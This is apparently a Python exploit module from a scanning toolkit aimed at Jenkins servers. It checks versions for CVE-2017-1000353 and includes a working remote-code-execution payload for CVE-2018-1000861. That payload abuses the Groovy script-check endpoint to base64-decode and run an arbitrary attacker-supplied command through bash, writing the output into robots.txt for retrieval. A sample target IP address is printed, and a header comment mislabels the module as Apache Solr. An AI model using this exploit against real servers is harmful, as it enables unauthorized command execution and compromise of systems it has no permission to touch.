import requests,base64,urllib
from ClassCongregation import _urlparse
from requests_toolbelt.utils import dump
import urllib.parse
import CodeTest
################
##--ApacheSolr--##
#cve_2017_1000353 版本确认
#cve_2018_1000861 命令执行
################
#echo VuLnEcHoPoCSuCCeSS
#VULN = None => 漏洞测试
#VULN = True => 命令执行
CodeTest.VULN = None
TIMEOUT = 10
class Jenkins():
    def __init__(self, url, CMD):
        self.url = url
        self.CMD = CMD
        self.payload_cve_2018_1000861 = '/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.' \
            'scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public+class+' \
            'x+%7B%0A++public+x%28%29%7B%0A++++%22bash+-c+%7Becho%2CRECOMMAND%7D%7C%7Bbase64%2C-d%7D%7C%7B' \
            'bash%2C-i%7D%22.execute%28%29%0A++%7D%0A%7D'
            
    def cve_2017_1000353(self):
        self.pocname = "Jenkins: CVE-2017-1000353"
        self.method = "get"
        self.rawdata = "null"
        self.info = CodeTest.Colored_.rce()
        self.cmd = urllib.parse.quote(self.CMD)
        self.r = "PoCWating"     
        try:
            if CodeTest.VULN is None:
                self.request = requests.get(self.url, headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                self.jenkins_version = self.request.headers['X-Jenkins']
                self.jenkinsvuln = "2.56"
                self.jenkinsvuln_lts = "2.46.1"
                self.jver = self.jenkins_version.replace(".","")
                self.jenkins_lts = int(self.jver)
                if self.jenkins_version.count(".",0,len(self.jenkins_version)) == 1:
                    if self.jenkins_version <= self.jenkinsvuln:
                        self.info += " [version:" + self.jenkins_version + "]"
                        self.r = "PoCSuCCeSS"
                elif self.jenkins_version.count(".",0,len(self.jenkins_version)) == 2:
                    if self.jenkins_lts <= 2461:
                        self.info += " [version:lts" + self.jenkins_version + "]"
                        self.r = "PoCSuCCeSS"
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                pass
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)     
    
    def cve_2018_1000861(self):
        self.pocname = "Jenkins: CVE-2018-1000861"
        self.method = "get"
        self.rawdata = "null"
        self.c_echo = "echo \":-)\" > $JENKINS_HOME/war/robots.txt;"+self.CMD+" >> $JENKINS_HOME/war/robots.txt"
        self.c_base = base64.b64encode(str.encode(self.c_echo))
        self.c_cmd = self.c_base.decode('ascii')
        self.cmd = urllib.parse.quote(self.c_cmd)
        self.payload = self.payload_cve_2018_1000861.replace("RECOMMAND", self.cmd)
        self.info = CodeTest.Colored_.rce()
        try:
            try:
                self.request = requests.get(self.url, timeout=TIMEOUT, verify=False)
                self.jenkins_version = self.request.headers['X-Jenkins']
                self.info += " [version:" + self.jenkins_version + "]"
            except:
                pass
            self.request = requests.get(self.url + self.payload, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            self.request = requests.get(self.url + "/robots.txt", timeout=TIMEOUT, verify=False)
            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

print("""eg: http://139.159.177.0:8888/login?from=%2F
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Jenkins           | cve_2017_1000353 |  Y  |  N  | <= 2.56, LTS <= 2.46.1, jenkins-ci remote code execution    |
| Jenkins           | cve_2018_1000861 |  Y  |  Y  | <= 2.153, LTS <= 2.138.3, remote code execution             |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
def check(**kwargs):
    if CodeTest.VULN == None:
        ExpJenkins = Jenkins(_urlparse(kwargs['url']),"echo VuLnEcHoPoCSuCCeSS")
    else:
        ExpJenkins = Jenkins(_urlparse(kwargs['url']),kwargs['cmd'])
    if kwargs['pocname'] == "cve_2017_1000353":
        ExpJenkins.cve_2017_1000353()
    elif kwargs['pocname'] == "cve_2018_1000861":
        ExpJenkins.cve_2018_1000861()
    else:
        ExpJenkins.cve_2017_1000353()
        ExpJenkins.cve_2018_1000861()

